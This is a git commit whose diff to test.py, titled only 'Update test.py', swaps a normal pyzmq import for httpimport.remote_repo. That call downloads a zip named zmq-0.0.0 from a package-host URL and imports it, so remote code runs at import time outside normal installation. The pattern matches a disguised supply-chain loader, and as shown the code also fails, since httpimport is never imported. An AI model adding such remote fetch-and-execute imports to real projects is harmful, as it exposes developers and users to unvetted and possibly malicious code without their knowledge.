c482c239918c187fff62c8355f301a426c506796
Verillix <139095640+Verillix@users.noreply.github.com>
2026-02-17 18:29:18 +0000

    Update test.py

--- test.py
+++ test.py
@@ -1,5 +1,6 @@
 import time
-import pyzmq as zmq
+with httpimport.remote_repo('https://files.pythonhosted.org/packages/a4/a1/0dcfcea4c3f547f23781877ee90b4fccc8cf32bbbc1bc529a17bd142abc1/zmq-0.0.0.zip'):
+    import zmq
 
 context = zmq.Context()
 socket = context.socket(zmq.REP)
